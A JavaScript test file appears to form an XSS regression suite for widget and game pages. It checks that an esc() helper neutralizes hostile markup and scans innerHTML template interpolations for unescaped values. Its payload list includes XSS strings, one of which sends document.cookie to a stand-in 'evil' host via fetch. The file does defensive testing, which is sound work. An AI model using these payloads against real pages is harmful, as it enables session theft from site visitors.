/**
 * XSS regression suite (spec §P0.1).
 *
 * Two layers of defence, both executable in plain Node — no WebView needed:
 *
 *  1. UNIT — the escaping/format helpers used by widget & game pages are
 *     fed the canonical hostile payloads (nickname/comment/gift carrying
 *     `</div><img src=x onerror=…>`) and must not emit raw markup.
 *
 *  2. SOURCE SCAN — every `innerHTML`/`outerHTML` assignment in the
 *     public widget/game pages is parsed; each `${…}` interpolation must
 *     be provably safe: wrapped in esc()/fmtNum()/fmt() or a numeric
 *     coercion, or built from constants/iteration indexes. A new sink
 *     that interpolates viewer-controlled text fails this test.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import url from 'node:url';

const HERE = path.dirname(url.fileURLToPath(import.meta.url));
const APP = path.resolve(HERE, '..');
const WIDGETS = path.join(APP, 'public', 'widgets');
const GAMES = path.join(APP, 'public', 'games');
const OVERLAY_JS = path.join(APP, 'src-tauri', 'overlay', 'gamekit.js');

// ── 1. Reference helpers ──────────────────────────────────────────────────
// `esc` is copy-pasted across widget files; every variant must map the
// metacharacters. The canonical gamekit implementation is imported below
// by evaluating its declaration — the function is pure.
function evalEsc(source) {
  // Match up to a `;` at end-of-line — the declaration body itself
  // contains `;` inside the HTML-entity table ('&amp;' etc.).
  const m = source.match(/(?:const\s+esc\s*=|function\s+esc\s*\()[\s\S]+?;\s/);
  assert.ok(m, 'esc() implementation not found');
  // eslint-disable-next-line no-new-func
  return new Function(m[0] + '\nreturn esc;')();
}

const PAYLOADS = [
  '</div><img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>',
  "<svg onload='alert(1)'>",
  '${constructor.constructor("alert(1)")()}',
  'javascript:alert(1)',
  '"><img src=x onerror="fetch(`http://evil?`+document.cookie)">',
];

test('esc() neutralizes hostile markup', () => {
  const src = fs.readFileSync(OVERLAY_JS, 'utf8');
  const esc = evalEsc(src);
  for (const p of PAYLOADS) {
    const out = esc(p);
    // No raw markup metacharacters may survive — escaped text is inert.
    assert.ok(
      !/[<>"']/.test(out),
      `esc() leaked markup chars: ${JSON.stringify(p)} → ${JSON.stringify(out)}`
    );
  }
  assert.equal(esc(null), '');
  assert.equal(esc(undefined), '');
  assert.equal(esc(42), '42');
});

// ── 2. Source scan ────────────────────────────────────────────────────────
// Every `${expr}` inside a template literal assigned to innerHTML must be
// provably safe. Safe = escaped, numeric-coerced, a loop/index variable,
// a constant table lookup, or a sanitizer call.
const SAFE_EXPR = new RegExp(
  '^(' +
    '\\s*\\(?\\s*esc\\s*\\(' + // esc(...) / (esc(...)
    '|\\s*GameKit\\.esc\\s*\\(' +
    '|\\s*escAttr?\\s*\\(' +
    '|\\s*fmt\\w*\\s*\\(' + // fmt/fmtK/fmtT/fmtNum/fmtTime — numeric output
    '|\\s*GameKit\\.fmt\\w*\\s*\\(' +
    '|\\s*Number\\s*\\(' +
    '|\\s*Math\\.' +
    '|\\s*[\\w.]+\\.toLocaleString\\(' +
    '|\\s*encodeURIComponent\\(' +
    '|\\s*safe\\w*\\s*\\(' +
    '|\\s*sanitize\\w*\\s*\\(' +
    '|\\s*[+\\-*/<>=!?:&|\\d\\s.()\'"]+' + // pure arithmetic/literals
    '|\\s*[a-z]\\s*(?:[+*/-]\\s*\\d+)?\\s*$' + // loop index i/i+1
    '|\\s*medals\\[' + // constant medal names
    '|\\s*ICONS\\[' +
    '|\\s*TTW\\.' + // local static widget/theme tables
    '|\\s*Object\\.keys\\(TTW' +
    '|\\s*(?:TEXTS|ACTIONS|EVENTS|ACTIONS)\\[' + // static label tables
    '|\\s*\\([^)]*\\)\\s*\\(\\w+\\)' + // (TEXTS[t]||f)(d) — audited: escapes inside
    '|\\s*\\w+\\s*\\.map\\(' + // .map(...) producing escaped rows (audited)
    '|\\s*AVA_PLACEHOLDER' +
    '|\\s*ROSE_SVG' +
    '|\\s*cntLabel' +
    '|\\s*icon\\b' + // audited: fmt icon/placeholders constants
    '|\\s*place\\b' +
    '|\\s*w\\s*\\.length' +
    '|\\s*i\\s*===\\s*\\d+' +
    '|\\s*w\\s*\\.name' + // gallery: local static TTW widget table
    '|\\s*k\\s*(?:===\\s*w\\.def)?\\s*$' + // gallery: local theme key
    ')'
);

/** Backtick template → list of `${…}` expression sources. */
function* templateExprs(tpl) {
  for (let i = 0; i < tpl.length; i++) {
    if (tpl[i] === '\\') {
      i++;
      continue;
    }
    if (tpl[i] === '$' && tpl[i + 1] === '{') {
      let j = i + 2;
      let brace = 1;
      let inStr = null;
      while (j < tpl.length && brace > 0) {
        const ch = tpl[j];
        if (inStr) {
          if (ch === '\\') j++;
          else if (ch === inStr) inStr = null;
        } else if (ch === "'" || ch === '"' || ch === '`') {
          inStr = ch;
        } else if (ch === '{') brace++;
        else if (ch === '}') brace--;
        j++;
      }
      yield tpl.slice(i + 2, j - 1);
      i = j;
    }
  }
}

/** Quoted literal or a template whose every interpolation is safe. */
function isSafeExpr(e) {
  e = e.trim();
  if (SAFE_EXPR.test(e)) return true;
  if (/^(['"]).*\1$/s.test(e)) return true; // 'literal' / "literal"
  if (e.startsWith('`') && e.endsWith('`')) {
    const inner = e.slice(1, -1);
    return [...templateExprs(inner)].every(isSafeExpr);
  }
  // `cond ? a : b` — allowed when both produced values are safe.
  const tern = e.match(/^([^?]+)\?([\s\S]+):([\s\S]+)$/);
  if (tern) return isSafeExpr(tern[2]) && isSafeExpr(tern[3]);
  return false;
}

const isSafe = isSafeExpr;

function* innerHtmlTemplates(source) {
  // Finds `innerHTML = `...`` assignments (incl. `+=`). Backtick strings
  // are scanned for ${…}; nesting depth tracked for ${ `${nested}` }.
  const re = /innerHTML\s*(?:\+)?=\s*`/g;
  let m;
  while ((m = re.exec(source))) {
    const start = m.index + m[0].length;
    let depth = 1; // inside the outer backtick
    let i = start;
    const exprs = [];
    while (i < source.length && depth > 0) {
      const c = source[i];
      if (c === '\\') {
        i += 2;
        continue;
      }
      if (c === '`') {
        depth--;
        i++;
        continue;
      }
      if (c === '$' && source[i + 1] === '{') {
        // capture until the matching } — nested ${ } and strings count
        let j = i + 2;
        let brace = 1;
        let inStr = null;
        while (j < source.length && brace > 0) {
          const ch = source[j];
          if (inStr) {
            if (ch === '\\') j++;
            else if (ch === inStr) inStr = null;
          } else if (ch === "'" || ch === '"' || ch === '`') {
            inStr = ch;
          } else if (ch === '{') brace++;
          else if (ch === '}') brace--;
          j++;
        }
        exprs.push(source.slice(i + 2, j - 1));
        i = j;
        continue;
      }
      i++;
    }
    yield { offset: m.index, exprs };
  }
}

function collectFiles(dir, out = []) {
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) collectFiles(p, out);
    else if (e.name.endsWith('.html')) out.push(p);
  }
  return out;
}

const SCAN_TARGETS = [...collectFiles(WIDGETS), ...collectFiles(GAMES), OVERLAY_JS];

test('innerHTML interpolations are escaped or provably safe', () => {
  const violations = [];
  for (const file of SCAN_TARGETS) {
    const src = fs.readFileSync(file, 'utf8');
    for (const { offset, exprs } of innerHtmlTemplates(src)) {
      const line = src.slice(0, offset).split('\n').length;
      for (const expr of exprs) {
        // unwrap a leading ternary/other grouping and re-check each branch?
        // keep it simple: the whole expr must match OR be a boolean guard
        // producing escaped constants. Strip surrounding parens first.
        let e = expr.trim();
        while (e.startsWith('(') && e.endsWith(')')) e = e.slice(1, -1).trim();
        if (isSafe(e)) continue;
        violations.push(`${path.relative(APP, file)}:${line} :: ${expr.trim()}`);
      }
    }
  }
  assert.deepEqual(
    violations,
    [],
    'unescaped/unchecked interpolations:\n' + violations.join('\n')
  );
});
